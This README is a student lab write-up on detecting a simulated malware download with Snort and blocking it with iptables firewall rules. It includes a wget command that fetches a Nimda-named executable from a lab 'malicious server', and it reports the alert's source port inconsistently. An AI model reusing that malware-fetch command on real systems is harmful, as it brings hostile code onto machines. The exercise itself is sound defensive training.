## Snort IDS & Firewall Rules (iptables)

## 📌 Overview

This lab demonstrates how **Intrusion Detection Systems (IDS)** and **firewalls** work together to detect and block malicious traffic. Using Snort and iptables in a controlled lab environment, I simulated malware traffic, analyzed alerts, and enforced security controls.

---

## 🎯 Objectives

* Configure a virtual lab environment
* Monitor real-time IDS alerts using Snort
* Simulate malicious traffic and analyze detection
* Capture network traffic using tcpdump
* Implement firewall rules to block malicious activity

---

## 🏗️ Lab Environment

* **Platform:** CyberOps Workstation VM
* **Tools Used:** Snort, tcpdump, wget, iptables, Mininet
* **Topology:** Simulated network with attacker, router (R1), and hosts



---

## ⚙️ Part 1: Environment Setup

### 🔹 Network Configuration

* Configured VM network (Bridged/NAT)
* Ran DHCP configuration script:

```bash
sudo ./lab.support.files/scripts/configure_as_dhcp.sh
```

* Verified connectivity:

```bash
ping www.cisco.com
```


---

## 🔍 Part 2: IDS Monitoring & Attack Simulation

### 🔹 Start Mininet

```bash
sudo ./lab.support.files/scripts/cyberops_extended_topo_no_fw.py
```

<img width="331" height="170" alt="starting topology" src="https://github.com/user-attachments/assets/945da14e-9517-4e85-b16c-bc285266762c" />


---

### 🔹 Launch Snort IDS (on R1)

```bash
./lab.support.files/scripts/start_snort.sh
```

* Snort runs in **IDS mode** and monitors traffic in real-time.

<img width="477" height="365" alt="snort_running" src="https://github.com/user-attachments/assets/ec179c92-5c90-47b9-a1db-8c3c9ec6c6ca" />


---

### 🔹 Setup Malicious Server (H10)

```bash
./lab.support.files/scripts/mal_server_start.sh
```

* Verified server is listening:

```bash
netstat -tunpa
```

<img width="237" height="172" alt="netstat_sc" src="https://github.com/user-attachments/assets/c4f38806-2a6f-49e3-8377-342c7ec8604d" />


---

### 🔹 Simulate Malware Download (H5)

```bash
wget 209.165.202.133:6666/W32.Nimda.Amm.exe
```

### ✅ Key Observations

* **Port Used:** `6666` (indicator: URL + netstat output)
* **Download Status:** Successful
* **IDS Alert:** Triggered

<img width="228" height="179" alt="wget 1" src="https://github.com/user-attachments/assets/10c5782c-6115-4fd3-bd34-a6526fedada7" />


---

### 🔹 IDS Alert Analysis

Example alert:

```
Malicious Server Hit!
{TCP} 209.165.200.235:34484 -> 209.165.202.133:6666
```

### 🧠 Findings

* **Source IP:** 209.165.200.235
* **Destination IP:** 209.165.202.133
* **Source Port** 54316
* **Destination Port:** 6666
* **Alert Message:** Malicious Server Hit

<img width="244" height="168" alt="snort result" src="https://github.com/user-attachments/assets/91bf011e-523f-44f7-9e1e-19e222e45b6e" />


---

## 📦 Packet Capture with tcpdump

### 🔹 Start Capture

```bash
tcpdump -i H5-eth0 -w nimda.download.pcap &
```

### 🔹 Re-run Attack

```bash
wget 209.165.202.133:6666/W32.Nimda.Amm.exe
```

### 🔹 Stop Capture

```bash
fg
Ctrl + C
```

### 🔹 Verify Capture File

```bash
ls -l
```

<img width="229" height="177" alt="pcap" src="https://github.com/user-attachments/assets/28b1eea4-c87f-48c3-8fcd-ca3528da895f" />


### 🧠 Why PCAP Matters

* Enables **deep packet inspection**
* Useful for **forensics & malware analysis**
* Can be analyzed in tools like Wireshark

---

## 🔥 Part 3: Firewall Rule Implementation

### 🔹 View Existing Rules

```bash
iptables -L -v
```

### 🧠 Chains Identified

* INPUT
* OUTPUT
* FORWARD

<img width="249" height="139" alt="IPTABLES" src="https://github.com/user-attachments/assets/41ebbb8f-745d-4ac2-b005-3bbee16380ab" />


---

### 🔹 Block Malicious Traffic

```bash
iptables -I FORWARD -p tcp -d 209.165.202.133 --dport 6666 -j DROP
```

<img width="242" height="178" alt="iptables FORWARD" src="https://github.com/user-attachments/assets/223779c2-bbe8-4d1d-a6dc-07f3244e772b" />


---

### 🔹 Test Blocking

```bash
wget 209.165.202.133:6666/W32.Nimda.Amm.exe
```

### ❌ Result

* Download failed (connection timed out)

<img width="248" height="164" alt="Wget after blocking" src="https://github.com/user-attachments/assets/4fdf3782-4d7b-4c1f-94c3-518824c3562f" />


---

### 🧠 Analysis

* Firewall successfully blocked traffic
* IDS detects threats, firewall enforces prevention

### 💡 More Aggressive Approach

* Block entire IP:

```bash
iptables -I FORWARD -d 209.165.202.133 -j DROP
```

---

## 🧹 Cleanup

```bash
quit
sudo mn -c
```

---

## 📚 Key Takeaways

* IDS (**Snort**) detects malicious activity via signatures
* Firewalls (**iptables**) enforce access control policies
* Combining both improves network security posture
* Packet capture is critical for **incident investigation**

---

## 🚀 Skills Gained

* Network traffic analysis
* IDS alert interpretation
* Firewall rule creation
* Packet capture & analysis
* Attack simulation in lab environments
